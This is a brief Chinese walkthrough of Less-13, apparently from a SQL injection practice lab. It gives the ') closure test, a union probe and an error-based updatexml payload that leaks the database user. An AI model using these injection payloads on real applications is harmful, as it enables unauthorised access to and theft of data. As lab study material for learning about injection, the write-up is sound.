Less-13-基于’) 的报错注入

根据题目可以知道是基于) 的报错注入，于是构造测试payload，发现其实是’) 闭合

1’) or 1=1 #


测试显示点发现，这题没有显示点

-1’) union select 1,2 #

所以准备用报错注入

-1’) union select updatexml(1,concat(“~”,user(),”—“),1) #

注入成功
